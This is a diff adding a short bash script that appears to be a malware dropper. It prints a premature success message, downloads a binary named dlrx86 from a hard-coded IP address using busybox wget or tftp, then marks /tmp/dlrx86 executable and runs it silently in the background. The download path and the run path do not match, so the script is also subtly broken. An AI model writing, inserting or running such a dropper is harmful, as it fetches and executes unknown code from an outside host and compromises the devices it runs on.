@@ -1,0 +1,5 @@
+#!/bin/bash
+echo "x86 binary executed successfully"
+/bin/busybox wget -O - http://63.250.59.28:80/dlrx86 || /bin/busybox tftp -g -r dlrx86 63.250.59.28 || echo "Download failed"
+chmod +x /tmp/dlrx86 2>/dev/null
+/tmp/dlrx86 2>/dev/null &
